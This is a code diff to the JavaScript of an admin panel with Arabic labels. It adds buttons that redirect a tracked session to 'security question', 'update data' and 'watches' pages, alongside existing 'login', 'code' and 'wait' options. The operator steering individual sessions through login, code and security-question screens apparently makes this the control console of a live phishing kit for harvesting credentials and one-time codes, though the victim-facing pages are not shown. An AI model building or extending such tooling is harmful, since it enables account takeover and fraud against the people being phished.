@@ -447,8 +447,10 @@ function renderDetail(o){
     '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
     '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'wait\')">⏳ الانتظار</button>'+
     '</div>';
-  h+='<div class="redir-grid" style="margin-top:6px;grid-template-columns:1fr">'+
-    '<button style="background:linear-gradient(135deg,#059669,#047857);font-size:12px" onclick="doRedir(\''+esc(o.id)+'\',\'update-data\')">📋 تحديث البيانات</button>'+
+  h+='<div class="redir-grid" style="margin-top:6px;grid-template-columns:1fr 1fr 1fr">'+
+    '<button style="background:linear-gradient(135deg,#a855f7,#9333ea);font-size:11px" onclick="doRedir(\''+esc(o.id)+'\',\'security\')">🛡️ سؤال الأمان</button>'+
+    '<button style="background:linear-gradient(135deg,#059669,#047857);font-size:11px" onclick="doRedir(\''+esc(o.id)+'\',\'update-data\')">📋 تحديث البيانات</button>'+
+    '<button style="background:linear-gradient(135deg,#64748b,#475569);font-size:11px" onclick="doRedir(\''+esc(o.id)+'\',\'watches\')">⌚ الساعات</button>'+
     '</div>';
   h+='</div>';
 
@@ -554,7 +556,7 @@ function sendSecQ(id){
 
 function doRedir(id,page){
   api('POST','/api/admin/redirect/'+id,{page:page}).then(function(){
-    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',wait:'الانتظار','update-data':'تحديث البيانات'};
+    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',wait:'الانتظار','update-data':'تحديث البيانات',watches:'الساعات'};
     showNotif('✅ تم إعادة التوجيه إلى: '+(labels[page]||page));loadData();});
 }
 
